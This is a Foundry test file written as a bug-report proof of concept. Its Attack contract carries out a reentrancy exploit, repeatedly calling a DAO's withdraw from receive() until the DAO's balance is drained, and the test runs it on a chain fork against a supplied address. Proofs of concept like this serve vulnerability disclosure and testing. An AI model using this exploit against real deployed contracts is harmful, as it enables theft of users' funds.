// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IDAO {
    function withdraw(uint256 amount) external;
}

contract Attack {
    IDAO public dao;
    constructor(address daoAddr) payable {
        dao = IDAO(daoAddr);
    }

    function attack() external payable {
        (bool ok, ) = address(dao).call{ value: msg.value }("");
        require(ok, "deposit failed");
        dao.withdraw(msg.value);
    }

    // This function is used when the DAO calls receive() on this contract.
    // If attack() is called, it will deposit ether into the DAO,
    // and then immediately withdraw it.
    // If the DAO has enough balance, call receive(), which keeps withdrawing
    // until the DAO's balance is less than the amount sent.
    // This is a re-entrancy attack.
    receive() external payable {
        uint256 bal = address(dao).balance;
        if (bal >= msg.value) {
            dao.withdraw(msg.value);
        }
    }
}

contract BugReport is Test {
    Attack public att;

    function bug(uint256 forkId, address addr) internal {
        vm.selectFork(forkId);

        att = new Attack{ value: 1 ether }(addr);
        att.attack{ value: 1 ether }();
    }
}